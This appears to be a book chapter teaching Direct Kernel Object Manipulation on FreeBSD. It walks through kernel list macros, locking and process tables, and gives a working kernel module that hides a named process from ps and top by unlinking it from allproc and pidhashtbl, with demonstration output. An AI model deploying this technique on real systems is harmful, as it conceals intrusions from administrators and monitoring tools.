<html><head></head><body><div class="chapter" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="direct_kernel_object_manipulation"/>Chapter 3. DIRECT KERNEL OBJECT MANIPULATION</h1></div></div></div><p>All operating systems store internal record-keeping data within main memory, usually as objects—that is, structures, queues, and the like. Whenever you ask the kernel for a list of running processes, open ports, and so on, this data is parsed and returned. Because this data is stored in main memory, it can be manipulated directly; there is no need to install a call hook to redirect control flow. This technique is commonly referred to as <span class="emphasis"><em>Direct Kernel Object Manipulation (DKOM)</em></span> (Hoglund and Butler, 2005).<a id="IDX-CHP-3-0169" class="indexterm"/></p><p>Before I get into this topic, however, let's look at how kernel data is stored in a FreeBSD system.</p><div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="kernel_queue_data_structures"/>Kernel Queue Data Structures</h1></div></div></div><p>In general, a lot of interesting information is stored as a <span class="emphasis"><em>queue data structure</em></span> (also known as a <span class="emphasis"><em>list</em></span>) inside the kernel. One example is the list of loaded linker files; another is the list of loaded kernel modules.<a id="IDX-CHP-3-0170" class="indexterm"/><a id="IDX-CHP-3-0171" class="indexterm"/></p><p>The header file <code class="literal">&lt;sys/queue.h&gt;</code> defines four different types of queue data structures: singly-linked lists, singly-linked tail queues, doubly-linked lists, and doubly-linked tail queues. This file also contains 61 macros for declaring and operating on these structures.</p><p>The following five macros are the basis for DKOM with doubly-linked lists.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>The macros for manipulating singly-linked lists, singly-linked tail queues, and doubly-linked tail queues are not discussed because they are in effect identical to the ones shown below. For details on the use of these macros, see the queue(3) manual page.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_list_head_macro"/>The LIST_HEAD Macro</h2></div></div></div><p>A doubly-linked list is headed by a structure defined by the <code class="literal">LIST_HEAD</code> macro. This structure contains a single pointer to the first element on the list. The elements are doubly-linked so that an arbitrary element can be removed without traversing the list. New elements can be added to the list before an existing element, after an existing element, or at the head of the list.<a id="IDX-CHP-3-0174" class="indexterm"/><a id="IDX-CHP-3-0172" class="indexterm"/><a id="IDX-CHP-3-0173" class="indexterm"/></p><p>The following is the <code class="literal">LIST_HEAD</code> macro definition:</p><a id="I_programlisting3_d1e3088"/><pre class="programlisting">
#define LIST_HEAD(name, type)                                           \
struct name {                                                           \
        struct type *lh_first;  /* first element */                     \
}
</pre><p>In this definition, <code class="literal">name</code> is the name of the structure to be defined, and <code class="literal">type</code> specifies the types of elements to be linked into the list.</p><p>If a <code class="literal">LIST_HEAD</code> structure is declared as follows:</p><a id="I_programlisting3_d1e3103"/><pre class="programlisting">
LIST_HEAD(HEADNAME, TYPE) head;
</pre><p>then a pointer to the head of the list can later be declared as:</p><a id="I_programlisting3_d1e3107"/><pre class="programlisting">
struct HEADNAME *headp;
</pre></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_list_head_initializer_macro"/>The LIST_HEAD_INITIALIZER Macro</h2></div></div></div><p>The head of a doubly-linked list is initialized by the <code class="literal">LIST_HEAD_INITIALIZER</code> macro.<a id="IDX-CHP-3-0175" class="indexterm"/></p><a id="I_programlisting3_d1e3122"/><pre class="programlisting">
#define LIST_HEAD_INITIALIZER(head)                                     \
        { NULL }
</pre></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_list_entry_macro"/>The LIST_ENTRY Macro</h2></div></div></div><p>The <code class="literal">LIST_ENTRY</code> macro declares a structure that connects the elements in a doubly-linked list.<a id="IDX-CHP-3-0176" class="indexterm"/></p><a id="I_programlisting3_d1e3137"/><pre class="programlisting">
#define LIST_ENTRY(type)                                                \
struct {                                                                \
        struct type *le_next;   /* next element */                      \
        struct type **le_prev;  /* address of previous element */       \
}
</pre><p>This structure is referenced during insertion, removal, and traversal of the list.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_list_foreach_macro"/>The LIST_FOREACH Macro</h2></div></div></div><p>A doubly-linked list is traversed with the <code class="literal">LIST_FOREACH</code> macro.<a id="IDX-CHP-3-0182" class="indexterm"/><a id="IDX-CHP-3-0177" class="indexterm"/><a id="IDX-CHP-3-0178" class="indexterm"/><a id="IDX-CHP-3-0179" class="indexterm"/><a id="IDX-CHP-3-0180" class="indexterm"/><a id="IDX-CHP-3-0181" class="indexterm"/></p><a id="I_programlisting3_d1e3177"/><pre class="programlisting">
#define LIST_FOREACH(var, head, field)                                  \
        for ((var) = LIST_FIRST((head));                                \
            (var);                                                      \
            (var) = LIST_NEXT((var), field))
</pre><p>This macro traverses the list referenced by <code class="literal">head</code> in the forward direction, assigning each element in turn to <code class="literal">var</code>. The <code class="literal">field</code> argument contains the structure declared with the <code class="literal">LIST_ENTRY</code> macro.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_list_remove_macro"/>The LIST_REMOVE Macro</h2></div></div></div><p>An element on a doubly-linked list is decoupled with the <code class="literal">LIST_REMOVE</code> macro.<a id="IDX-CHP-3-0183" class="indexterm"/></p><a id="I_programlisting3_d1e3206"/><pre class="programlisting">
#define LIST_REMOVE(elm, field) do {                                    \
        if (LIST_NEXT((elm), field) != NULL)                            \
                LIST_NEXT((elm), field)-&gt;field.le_prev =             \
                    (elm)-&gt;field.le_prev;                            \
        *(elm)-&gt;field.le_prev = LIST_NEXT((elm), field);             \
} while (0)
</pre><p>Here, <code class="literal">elm</code> is the element to be removed, and <code class="literal">field</code> contains the structure declared with the <code class="literal">LIST_ENTRY</code> macro.</p></div></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="synchronization_issues"/>Synchronization Issues</h1></div></div></div><p>As you'll soon see, you can alter how the kernel perceives the operating system's state by manipulating the various kernel queue data structures. However, you risk damaging the system by simply traversing and/or modifying these objects by virtue of being preemptible; that is, if your code is interrupted and another thread accesses or manipulates the same objects that you were manipulating, data corruption can result. Moreover, with symmetric multiprocessing (SMP), preemption isn't even necessary; if your code is running on one CPU, while another thread on another CPU is manipulating the same object, data corruption can occur.</p><p>To safely manipulate the kernel queue data structures—that is, in order to ensure thread synchronization—your code should acquire the appropriate lock (i.e., resource access control) first. In our examples, this will either be a mutex or shared/exclusive lock.<a id="IDX-CHP-3-0184" class="indexterm"/><a id="IDX-CHP-3-0185" class="indexterm"/></p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_mtx_lock_function"/>The mtx_lock Function</h2></div></div></div><p><span class="emphasis"><em>Mutexes</em></span> provide mutual exclusion for one or more data objects and are the primary method of thread synchronization.<a id="IDX-CHP-3-0186" class="indexterm"/><a id="IDX-CHP-3-0187" class="indexterm"/><a id="IDX-CHP-3-0188" class="indexterm"/></p><p>A kernel thread acquires a mutex by calling the <code class="literal">mtx_lock</code> function.<a id="IDX-CHP-3-0189" class="indexterm"/></p><a id="I_programlisting3_d1e3266"/><pre class="programlisting">
#include &lt;sys/param.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/mutex.h&gt;

void
mtx_lock(struct mtx *mutex);
</pre><p>If another thread is currently holding the mutex, the caller will sleep until the mutex is available.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_mtx_unlock_function"/>The mtx_unlock Function</h2></div></div></div><p>A mutex lock is released by calling the <code class="literal">mtx_unlock</code> function.</p><a id="I_programlisting3_d1e3278"/><pre class="programlisting">
#include &lt;sys/param.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/mutex.h&gt;

void
mtx_unlock(struct mtx *mutex);
</pre><p>If a higher priority thread is waiting for the mutex, the releasing thread may be preempted to allow the higher priority thread to acquire the mutex and run.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>For more on mutexes, see the mutex(9) manual page.<a id="IDX-CHP-3-0190" class="indexterm"/></p></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_sx_slock_and_sx_xlock_functions"/>The sx_slock and sx_xlock Functions</h2></div></div></div><p><span class="emphasis"><em>Shared/exclusive locks</em></span> (also known as <span class="emphasis"><em>sx locks</em></span>) are simple reader/writer locks that can be held across a sleep. As their name suggests, multiple threads may hold a shared lock, but only one thread may hold an exclusive lock. Furthermore, if one thread holds an exclusive lock, no other threads may hold a shared lock.<a id="IDX-CHP-3-0191" class="indexterm"/></p><p>A thread acquires a shared or exclusive lock by calling the <code class="literal">sx_slock</code> or <code class="literal">sx_xlock</code> functions, respectively.<a id="IDX-CHP-3-0192" class="indexterm"/></p><a id="I_programlisting3_d1e3314"/><pre class="programlisting">
#include &lt;sys/param.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/sx.h&gt;
void
sx_slock(struct sx *sx);

void
sx_xlock(struct sx *sx);
</pre></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_sx_sunlock_and_sx_xunlock_functions"/>The sx_sunlock and sx_xunlock Functions</h2></div></div></div><p>To release a shared or exclusive lock, call the <code class="literal">sx_sunlock</code> or <code class="literal">sx_xunlock</code> functions, respectively.<a id="IDX-CHP-3-0193" class="indexterm"/><a id="IDX-CHP-3-0194" class="indexterm"/><a id="IDX-CHP-3-0195" class="indexterm"/><a id="IDX-CHP-3-0196" class="indexterm"/><a id="IDX-CHP-3-0197" class="indexterm"/><a id="IDX-CHP-3-0198" class="indexterm"/><a id="IDX-CHP-3-0199" class="indexterm"/></p><a id="I_programlisting3_d1e3367"/><pre class="programlisting">
#include &lt;sys/param.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/sx.h&gt;

void
sx_sunlock(struct sx *sx);

void
sx_xunlock(struct sx *sx);
</pre><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>For more on shared/exclusive locks, see the sx(9) manual page.</p></div></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hiding_a_running_process"/>Hiding a Running Process</h1></div></div></div><p>Now, equipped with the macros and functions from the previous sections, I'll detail how to hide a running process using DKOM. First, though, we need some background information on process management.</p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_proc_structure"/>The proc Structure</h2></div></div></div><p>In FreeBSD the context of each process is maintained in a <code class="literal">proc</code> structure, which is defined in the <code class="literal">&lt;sys/proc.h&gt;</code> header. The following list describes the fields in <code class="literal">struct proc</code> that you'll need to understand in order to hide a running process.<a id="IDX-CHP-3-0200" class="indexterm"/><a id="IDX-CHP-3-0201" class="indexterm"/><a id="IDX-CHP-3-0202" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>I've tried to keep this list brief so that it can be used as a reference. You can skip over this list on your first reading and refer back to it when you face some real C code.</p></div><div class="variablelist"><dl><dt><span class="term"><strong class="userinput"><code>LIST_ENTRY(proc) p_list;</code></strong></span></dt><dd><p>This field contains the linkage pointers that are associated with the <code class="literal">proc</code> structure, which is stored on either the <code class="literal">allproc</code> or <code class="literal">zombproc</code> list (discussed in <a class="xref" href="ch03s03.html#the_allproc_list" title="The allproc List">The allproc List</a>). This field is referenced during insertion, removal, and traversal of either list.</p></dd><dt><span class="term"><strong class="userinput"><code>int p_flag;</code></strong></span></dt><dd><p>These are the process flags, such as <code class="literal">P_WEXIT</code>, <code class="literal">P_EXEC</code>, and so on, that are set on the running process. All the flags are defined in the <code class="literal">&lt;sys/proc.h&gt;</code> header.</p></dd><dt><span class="term"><strong class="userinput"><code>enum { PRS_NEW = 0, PRS_NORMAL, PRS_ZOMBIE } p_state;</code></strong></span></dt><dd><p>This field represents the current process state, where <code class="literal">PRS_NEW</code> identifies a newly born but incompletely initialized process, <code class="literal">PRS_NORMAL</code> identifies a "live" process, and <code class="literal">PRS_ZOMBIE</code> identifies a zombie process.</p></dd><dt><span class="term"><strong class="userinput"><code>pid_t p_pid;</code></strong></span></dt><dd><p>This is the process identifier (PID), which is a 32-bit integer value.</p></dd><dt><span class="term"><strong class="userinput"><code>LIST_ENTRY(proc) p_hash;</code></strong></span></dt><dd><p>This field contains the linkage pointers that are associated with the <code class="literal">proc</code> structure, which is stored on <code class="literal">pidhashtbl</code> (discussed in <a class="xref" href="ch03s04.html#pidhashtbl" title="pidhashtbl">pidhashtbl</a>). This field is referenced during insertion, removal, and traversal of <code class="literal">pidhashtbl</code>.</p></dd><dt><span class="term"><strong class="userinput"><code>struct mtx p_mtx;</code></strong></span></dt><dd><p>This is the resource access control associated with the <code class="literal">proc</code> structure. The header file <code class="literal">&lt;sys/proc.h&gt;</code> defines two macros, <code class="literal">PROC_LOCK</code> and <code class="literal">PROC_UNLOCK</code>, for conveniently acquiring and releasing this lock.</p><a id="I_programlisting3_d1e3508"/><pre class="programlisting">
#define PROC_LOCK(p)    mtx_lock(&amp;(p)-&gt;p_mtx)
#define PROC_UNLOCK(p)  mtx_unlock(&amp;(p)-&gt;p_mtx)
</pre></dd><dt><span class="term"><strong class="userinput"><code>struct vmspace *p_vmspace;</code></strong></span></dt><dd><p>This is the virtual memory state of the process, including the machine-dependent and machine-independent data structures, as well as statistics.</p></dd><dt><span class="term"><strong class="userinput"><code>char p_comm[MAXCOMLEN + 1];</code></strong></span></dt><dd><p>This is the name or command used to execute the process. The constant <code class="literal">MAXCOMLEN</code> is defined in the <code class="literal">&lt;sys/param.h&gt;</code> header as follows:</p><a id="I_programlisting3_d1e3530"/><pre class="programlisting">
#define MAXCOMLEN       19              /* max command name remembered */
</pre></dd></dl></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_allproc_list"/>The allproc List</h2></div></div></div><p>FreeBSD organizes its <code class="literal">proc</code> structures into two lists. All processes in the <code class="literal">ZOMBIE</code> state are located on the <code class="literal">zombproc</code> list; the rest are on the <code class="literal">allproc</code> list. This list is referenced—albeit indirectly—by <code class="literal">ps(1)</code>, <code class="literal">top(1)</code>, and other reporting tools to list the running processes on the system. Thus, you can hide a running process by simply removing its <code class="literal">proc</code> structure from the <code class="literal">allproc</code> list.<a id="IDX-CHP-3-0209" class="indexterm"/><a id="IDX-CHP-3-0210" class="indexterm"/><a id="IDX-CHP-3-0211" class="indexterm"/><a id="IDX-CHP-3-0203" class="indexterm"/><a id="IDX-CHP-3-0204" class="indexterm"/><a id="IDX-CHP-3-0205" class="indexterm"/><a id="IDX-CHP-3-0206" class="indexterm"/><a id="IDX-CHP-3-0207" class="indexterm"/><a id="IDX-CHP-3-0208" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>Naturally, one might think that by removing a <code class="literal">proc</code> structure from the <code class="literal">allproc</code> list, the associated process would not execute. In the past, several authors and hackers have stated that modifying <code class="literal">allproc</code> would be far too complicated, because it is used in process scheduling and other important system tasks. However, because processes are now executed at thread granularity, this is no longer the case.</p></div><p>The <code class="literal">allproc</code> list is defined in the <code class="literal">&lt;sys/proc.h&gt;</code> header as follows:</p><a id="I_programlisting3_d1e3650"/><pre class="programlisting">
extern struct proclist allproc;         /* list of all processes */
</pre><p>Notice that <code class="literal">allproc</code> is declared as a <code class="literal">proclist</code> structure, which is defined in the <code class="literal">&lt;sys/proc.h&gt;</code> header as follows:</p><a id="I_programlisting3_d1e3663"/><pre class="programlisting">
LIST_HEAD(proclist, proc);
</pre><p>From these listings, you can see that <code class="literal">allproc</code> is simply a kernel queue data structure—a doubly-linked list of <code class="literal">proc</code> structures, to be exact.</p><p>The following excerpt from <code class="literal">&lt;sys/proc.h&gt;</code> lists the resource access control associated with the <code class="literal">allproc</code> list.</p><a id="I_programlisting3_d1e3681"/><pre class="programlisting">
extern struct sx allproc_lock;
</pre></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="example-id2"/>Example</h2></div></div></div><p>Listing 3-1 shows a system call module designed to hide a running process by removing its <code class="literal">proc</code> structure(s) from the <code class="literal">allproc</code> list. The system call is invoked with one argument: a character pointer (i.e., a string) containing the name of the process to be hidden.<a id="IDX-CHP-3-0214" class="indexterm"/><a id="IDX-CHP-3-0215" class="indexterm"/><a id="IDX-CHP-3-0216" class="indexterm"/><a id="IDX-CHP-3-0212" class="indexterm"/><a id="IDX-CHP-3-0213" class="indexterm"/></p><a id="I_programlisting3_d1e3727"/><pre class="programlisting">
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/module.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/kernel.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/queue.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/sx.h&gt;
#include &lt;sys/mutex.h&gt;

struct process_hiding_args {
        char *p_comm;           /* process name */
};

/* System call to hide a running process. */
static int
process_hiding(struct thread *td, void *syscall_args)
{
        struct process_hiding_args *uap;
        uap = (struct process_hiding_args *)syscall_args;

        struct proc *p;

        ❶sx_xlock(&amp;allproc_lock);

        /* Iterate through the allproc list. */
        LIST_FOREACH(p, &amp;allproc, p_list) {
                 ❷PROC_LOCK(p);

                 ❸if (!p-&gt;p_vmspace || (p-&gt;p_flag &amp; P_WEXIT)) {
                               PROC_UNLOCK(p);
                               continue;
                }

                /* Do we want to hide this process? */
                ❹if (strncmp(p-&gt;p_comm, uap-&gt;p_comm, MAXCOMLEN) == 0)
                               ❺LIST_REMOVE(p, p_list);

                ❻PROC_UNLOCK(p);

        }

        ❼sx_xunlock(&amp;allproc_lock);

        return(0);

}

/* The sysent for the new system call. */
static struct sysent process_hiding_sysent = {
        1,                      /* number of arguments */
        process_hiding          /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{

        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                uprintf("System call loaded at offset %d.\n", offset);
                break;

        case MOD_UNLOAD:
                uprintf("System call unloaded from offset %d.\n", offset);
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);

}

SYSCALL_MODULE(process_hiding, &amp;offset, &amp;process_hiding_sysent, load, NULL);
</pre><p><span class="emphasis"><em>Listing 3-1: process_hiding.c</em></span></p><p>Notice how I've locked ❶ the <code class="literal">allproc</code> list and ❷ each <code class="literal">proc</code> structure, prior to inspection, to ensure thread synchronization—in layman's terms, to avoid a kernel panic. Of course, I also release ❻ ❼ each lock after I'm done.</p><p>An interesting detail about <code class="literal">process_hiding</code> is that prior to ❹ the process name comparison, I ❸ examine each process's virtual address space and process flags. If the former does not exist or the latter is set to "working on exiting" the <code class="literal">proc</code> structure is unlocked and skipped over. What's the point of hiding a process that's not going to run?</p><p>Another interesting detail worth mentioning is that after I ❺ remove the user-specified <code class="literal">proc</code> structure from the <code class="literal">allproc</code> list, I don't force an immediate exit from the <code class="literal">for</code> loop. That is, there is no <code class="literal">break</code> statement. To understand why, consider a process that has duplicated or forked itself so that the parent and child can each execute different sections of code at the same time. (This is a popular practice in network servers, such as <code class="literal">httpd</code>.) In this situation, asking the system for a list of running processes would return both the parent and child processes, because each child process gets its own individual entry on the <code class="literal">allproc</code> list. Therefore, in order to hide every instance of a single process, you need to iterate through <code class="literal">allproc</code> in its entirety.</p><p>The following output shows <code class="literal">process_hiding</code> in action:</p><a id="I_programlisting3_d1e3777"/><pre class="programlisting">
$ <strong class="userinput"><code>sudo kldload ./process_hiding.ko</code></strong>
System call loaded at offset 210.
$ <strong class="userinput"><code>ps</code></strong>
  PID  TT  STAT      TIME COMMAND
  530  v1  S      0:00.21 -bash (bash)
  579  v1  R+     0:00.02 ps
  502  v2  I      0:00.42 -bash (bash)
  529  v2  S+     0:02.52 top
$ <strong class="userinput"><code>perl -e '$p_comm = "top";' -e 'syscall(210, $p_comm);'</code></strong>
$ <strong class="userinput"><code>ps</code></strong>
  PID  TT  STAT      TIME COMMAND
  530  v1  S      0:00.26 -bash (bash)
  584  v1  R+     0:00.02 ps
  502  v2  I      0:00.42 -bash (bash)
</pre><p>Notice how I am able to hide <code class="literal">top(1)</code> from the output of <code class="literal">ps(1)</code>. Just for fun, let's look at this from <code class="literal">top(1)</code>'s perspective, shown below in a before-and-after style.</p><a id="I_programlisting3_d1e3802"/><pre class="programlisting">
last pid:   582;  load averages:  0.00,  0.03,  0.04    up 0+00:19:08  03:46:
❶20 processes:  1 running, 19 sleeping
CPU states:  0.0% user,  0.0% nice,  0.3% system, 14.1% interrupt, 85.5% idle
Mem: 6932K Active, 10M Inact, 14M Wired, 28K Cache, 10M Buf, 463M Free
Swap: 512M Total, 512M Free

  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME   WCPU COMMAND
  ❷529 ghost       1  96    0  2304K  1584K RUN      0:03  0.00% top
  502 ghost       1   8    0  3276K  2036K wait     0:00  0.00% bash
  486 root        1   8    0  1616K  1280K wait     0:00  0.00% login
  485 root        1   8    0  1616K  1316K wait     0:00  0.00% login
  530 ghost       1   5    0  3276K  2164K ttyin    0:00  0.00% bash
  297 root        1  96    0  1292K   868K select   0:00  0.00% syslogd
  408 root        1  96    0  3412K  2656K select   0:00  0.00% sendmail
  424 root        1   8    0  1312K  1032K nanslp   0:00  0.00% cron
  490 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  489 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  484 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  487 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  488 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  491 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  197 root        1 110    0  1384K  1036K select   0:00  0.00% dhclient
  527 root        1  96    0  1380K  1084K select   0:00  0.00% inetd
  412 smmsp       1  20    0  3300K  2664K pause    0:00  0.00% sendmail

. . .

last pid:   584;  load averages:  0.00,  0.03,  0.03    up 0+00:20:43  03:48:
❸19 processes:  19 sleeping
CPU states:  0.0% user,  0.0% nice,  0.7% system, 11.8% interrupt, 87.5% idle
Mem: 7068K Active, 11M Inact, 14M Wired, 36K Cache, 10M Buf, 462M Free
Swap: 512M Total, 512M Free

  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME   WCPU COMMAND
  502 ghost       1   8    0  3276K  2036K wait     0:00  0.00% bash
  486 root        1   8    0  1616K  1280K wait     0:00  0.00% login
  485 root        1   8    0  1616K  1316K wait     0:00  0.00% login
  530 ghost       1   5    0  3276K  2164K ttyin    0:00  0.00% bash
  297 root        1  96    0  1292K   868K select   0:00  0.00% syslogd
  408 root        1  96    0  3412K  2656K select   0:00  0.00% sendmail
  424 root        1   8    0  1312K  1032K nanslp   0:00  0.00% cron
  490 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  489 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  484 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  487 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  488 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  491 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  197 root        1 110    0  1384K  1036K select   0:00  0.00% dhclient
  527 root        1  96    0  1380K  1084K select   0:00  0.00% inetd
  412 smmsp       1  20    0  3300K  2664K pause    0:00  0.00% sendmail
  217 _dhcp       1  96    0  1384K  1084K select   0:00  0.00% dhclient
</pre><p>Notice how in the "before" section, <code class="literal">top(1)</code> reports ❶ one running process, ❷ itself, while in the "after" section it reports ❸ zero running processes—even though it is clearly still running . . . /me grins.</p></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hiding_a_running_process_redux"/>Hiding a Running Process Redux</h1></div></div></div><p>Of course, process management involves more than just the <code class="literal">allproc</code> and <code class="literal">zombproc</code> lists, and as such, hiding a running process involves more than just manipulating the <code class="literal">allproc</code> list. For instance:<a id="IDX-CHP-3-0217" class="indexterm"/><a id="IDX-CHP-3-0218" class="indexterm"/><a id="IDX-CHP-3-0219" class="indexterm"/></p><a id="I_programlisting3_d1e3843"/><pre class="programlisting">
$ <strong class="userinput"><code>sudo kldload ./process_hiding.ko</code></strong>
System call loaded at offset 210.
$ <strong class="userinput"><code>ps</code></strong>
  PID  TT  STAT      TIME COMMAND
  521  v1  S      0:00.19 -bash (bash)
  524  v1  R+     0:00.03 ps
  519  v2  I      0:00.17 -bash (bash)
  520  v2  S+     0:00.25 top
$ <strong class="userinput"><code>perl -e '$p_comm = "top";' -e 'syscall(210, $p_comm);'</code></strong>
$ <strong class="userinput"><code>ps -p 520</code></strong>
  PID  TT  STAT      TIME COMMAND
  520  v2  S+     0:00.56 top
</pre><p>Notice how the hidden process (<code class="literal">top</code>) was found through its PID. Undoubtedly, I'm going to remedy this. But first, some background information on FreeBSD hash tables<sup>[<a id="CHP-3-FN-1" href="#ftn.CHP-3-FN-1" class="footnote">1</a>]</sup> is required.<a id="IDX-CHP-3-0220" class="indexterm"/></p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_hashinit_function"/>The hashinit Function</h2></div></div></div><p>In FreeBSD, a <span class="emphasis"><em>hash table</em></span> is a contiguous array of <code class="literal">LIST_HEAD</code> entries that is initialized by calling the <code class="literal">hashinit</code> function.<a id="IDX-CHP-3-0223" class="indexterm"/><a id="IDX-CHP-3-0221" class="indexterm"/><a id="IDX-CHP-3-0222" class="indexterm"/></p><a id="I_programlisting3_d1e3907"/><pre class="programlisting">
#include &lt;sys/malloc.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/queue.h&gt;

void *
hashinit(int nelements, struct malloc_type *type, u_long *hashmask);
</pre><p>This function allocates space for a hash table of size <code class="literal">nelements</code>. If successful, a pointer to the allocated hash table is returned, with the bit mask (which is used in the hash function) set in <code class="literal">hashmask</code>.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="pidhashtbl"/>pidhashtbl</h2></div></div></div><p>For efficiency purposes, all running processes, in addition to being on the <code class="literal">allproc</code> list, are stored on a hash table named <code class="literal">pidhashtbl</code>. This hash table is used to locate a <code class="literal">proc</code> structure by its PID more quickly than an O(<span class="emphasis"><em>n</em></span>) walk of (i.e., a linear search through) the <code class="literal">allproc</code> list. This hash table is how the hidden process at the beginning of this section was found through its PID.</p><p><code class="literal">pidhashtbl</code> is defined in the <code class="literal">&lt;sys/proc.h&gt;</code> header as follows:</p><a id="I_programlisting3_d1e3944"/><pre class="programlisting">
extern LIST_HEAD(pidhashhead, proc) *pidhashtbl;
</pre><p>It is initialized in the file /sys/kern/kern_proc.c as:</p><a id="I_programlisting3_d1e3948"/><pre class="programlisting">
pidhashtbl = hashinit(maxproc / 4, M_PROC, &amp;pidhash);
</pre></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_pfind_function"/>The pfind Function</h2></div></div></div><p>To locate a process via <code class="literal">pidhashtbl</code>, a kernel thread calls the <code class="literal">pfind</code> function. This function is implemented in the file /sys/kern/kern_proc.c as follows:<a id="IDX-CHP-3-0226" class="indexterm"/><a id="IDX-CHP-3-0224" class="indexterm"/><a id="IDX-CHP-3-0225" class="indexterm"/></p><a id="I_programlisting3_d1e3980"/><pre class="programlisting">
struct proc *
pfind(pid)
        register pid_t pid;
{
        register struct proc *p;

        ❶sx_slock(&amp;allproc_lock);
        LIST_FOREACH(p, ❷PIDHASH(pid), p_hash)
                if (p-&gt;p_pid == pid) {
                        if (p-&gt;p_state == PRS_NEW) {
                                p = NULL;
                                break;
                        }
                        PROC_LOCK(p);
                        break;
                }
        sx_sunlock(&amp;allproc_lock);
        return (p);
}
</pre><p>Notice how the resource access control for <code class="literal">pidhashtbl</code> is ❶ <code class="literal">allproc_lock</code>—the same lock associated with the <code class="literal">allproc</code> list. This is because <code class="literal">allproc</code> and <code class="literal">pidhashtbl</code> are designed to be in synch.</p><p>Also, notice that <code class="literal">pidhashtbl</code> is traversed via the ❷ <code class="literal">PIDHASH</code> macro. This macro is defined in the <code class="literal">&lt;sys/proc.h&gt;</code> header as follows:<a id="IDX-CHP-3-0227" class="indexterm"/></p><a id="I_programlisting3_d1e4015"/><pre class="programlisting">
#define PIDHASH(pid)    (&amp;pidhashtbl[(pid) &amp; pidhash])
</pre><p>As you can see, <code class="literal">PIDHASH</code> is a macro substitution for <code class="literal">pidhashtbl</code>; specifically, it's the hash function.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="example-id3"/>Example</h2></div></div></div><p>In the following listing, I modify <code class="literal">process_hiding</code> to protect a running process from being found through its PID, with the changes shown in bold.</p><a id="I_programlisting3_d1e4033"/><pre class="programlisting">
static int
process_hiding(struct thread *td, void *syscall_args)
{
        struct process_hiding_args *uap;
        uap = (struct process_hiding_args *)syscall_args;

        struct proc *p;

        sx_xlock(&amp;allproc_lock);

        /* Iterate through the allproc list. */
        LIST_FOREACH(p, &amp;allproc, p_list) {
                PROC_LOCK(p);

                if (!p-&gt;p_vmspace || (p-&gt;p_flag &amp; P_WEXIT)) {
                        PROC_UNLOCK(p);
                        continue;
                }

                /* Do we want to hide this process? */
                if (strncmp(p-&gt;p_comm, uap-&gt;p_comm, MAXCOMLEN) == 0) <strong class="userinput"><code>{</code></strong>
                        LIST_REMOVE(p, p_list);
                        <strong class="userinput"><code>LIST_REMOVE(p, p_hash);
                }</code></strong>

                PROC_UNLOCK(p);
        }

        sx_xunlock(&amp;allproc_lock);

        return(0);

}
